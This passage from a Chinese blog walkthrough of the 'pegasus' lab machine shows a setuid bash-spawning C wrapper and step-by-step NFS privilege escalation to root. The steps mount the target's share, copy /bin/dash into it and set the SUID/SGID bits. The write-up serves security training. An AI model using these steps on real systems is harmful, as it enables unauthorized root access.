+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">  setreuid(geteuid(), getuid());</span><br><span class="line">  execv(<span class="string">"/bin/bash"</span>, argv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595491673735-eb46971d-24b3-4380-9b4c-da58a3622641.png#align=left&display=inline&height=163&margin=%5Bobject%20Object%5D&name=image.png&originHeight=251&originWidth=906&size=290126&status=done&style=none&width=588" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h1 id="nfs-提权-root"><a href="#nfs-提权-root" class="headerlink" title="nfs 提权 root"></a>nfs 提权 root</h1><p>sudo -l 发现 nfs 不用密码就可以以 root 权限执行（后面操作怕把电脑弄乱了就在虚拟机上操作了）</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595231487392-f76080fe-b324-4b0f-a407-702850256a0c.png#align=left&display=inline&height=87&margin=%5Bobject%20Object%5D&name=image.png&originHeight=129&originWidth=929&size=25582&status=done&style=none&width=628" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>启动：<code>sudo /usr/local/sbin/nfs start</code><br>然后在攻击机上创建一个用来挂载的文件夹<br><code>mkdir /mnt/pegasus</code><br>然后挂载上<br><code>mount -t nfs -o proto=tcp,port=2049 192.168.149.183:/opt/nfs /mnt/pegasus</code></p>
+<p>创建一个文件并且给他权限<br><code>touch /mnt/pegasus/hack_shell</code><br><code>chmod 777 /mnt/pegasus/hack_shell</code></p>
+<p>回到靶机，把 /bin/dash 拷过去<br><code>cp /bin/dash /opt/nfs/hack_shell</code></p>
+<p>然后在攻击机上给他权限<br><code>chmod u+s /mnt/pegasus/hack_shell</code><br><code>chmod g+s /mnt/pegasus/hack_shell</code></p>
+<p>这样在靶机一执行，就能拿到 root 权限</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595232297914-2e5e212d-aa4c-4146-9b3d-20fed1f88eb9.png#align=left&display=inline&height=474&margin=%5Bobject%20Object%5D&name=image.png&originHeight=683&originWidth=802&size=88682&status=done&style=none&width=556" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2022-10-03T13:52:43.712Z" itemprop="dateUpdated">2022-10-03 21:52:43</time>
+</span><br>
+
+
+        
+    </div>
+    
+    <footer>
+        <a href="https://yichen115.github.io">
+            <img src="/img/avatar.png" alt="yichen">
+            yichen
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://yichen115.github.io/2020/07/20/lgxkw7/&title=《pegasus》 — yichen's blog&pic=https://yichen115.github.io/img/avatar.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yichen115.github.io/2020/07/20/lgxkw7/&title=《pegasus》 — yichen's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://yichen115.github.io/2020/07/20/lgxkw7/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《pegasus》 — yichen's blog&url=https://yichen115.github.io/2020/07/20/lgxkw7/&via=https://yichen115.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://yichen115.github.io/2020/07/20/lgxkw7/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2020/07/26/mi07k6/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">攻防世界-web</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2020/07/16/gtb5ck/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">语雀自动同步到hexo博客</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.jpg" data-alipay="/img/alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>yichen &copy; 2020 - 2022</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://yichen115.github.io/2020/07/20/lgxkw7/&title=《pegasus》 — yichen's blog&pic=https://yichen115.github.io/img/avatar.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yichen115.github.io/2020/07/20/lgxkw7/&title=《pegasus》 — yichen's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://yichen115.github.io/2020/07/20/lgxkw7/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《pegasus》 — yichen's blog&url=https://yichen115.github.io/2020/07/20/lgxkw7/&via=https://yichen115.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://yichen115.github.io/2020/07/20/lgxkw7/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=https://yichen115.github.io/2020/07/20/lgxkw7/" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '记得回来啊！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '欢迎回来!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
